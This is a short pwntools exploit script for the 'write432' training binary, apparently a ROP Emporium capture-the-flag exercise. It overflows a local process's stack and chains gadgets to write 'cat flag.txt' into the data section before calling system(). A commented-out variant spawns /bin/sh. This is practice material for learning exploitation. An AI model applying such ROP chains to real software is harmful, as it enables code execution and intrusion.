from pwn import *

p = process("./write432")

junk = "X"*44
systm_call = p32(0x0804865a)
gdgt_pop2 = p32(0x080486da)
gdgt_mov = p32(0x08048670)
data_sect = 0x804a028
# EBP -> offset 40
# Stack addr 0 -> 48
# Stack addr 4 -> 52
# pop edi - pop ebp
# mov edi, ebp

############################# BASH
## Stage 1
# payld = junk
# payld += gdgt_pop2
# payld += p32(data_sect + 0)
# payld += "/bin"
# payld += gdgt_mov
## Stage 2
# payld += gdgt_pop2
# payld += p32(data_sect + 4)
# payld += "/sh\x00"
# payld += gdgt_mov
##################################


######################### CAT FLAG
## Stage 1
payld = junk
payld += gdgt_pop2
payld += p32(data_sect + 0)
payld += "cat "
payld += gdgt_mov
## Stage 2
payld += gdgt_pop2
payld += p32(data_sect + 4)
payld += "flag"
payld += gdgt_mov
## Stage 3
payld += gdgt_pop2
payld += p32(data_sect + 8)
payld += ".txt"
payld += gdgt_mov
##################################


## Stage 4, Final
payld += systm_call
payld += p32(data_sect)

# DEBUG
#print payld;exit()
p.recvuntil("> ")
p.sendline(payld)
raw_input()
p.interactive()
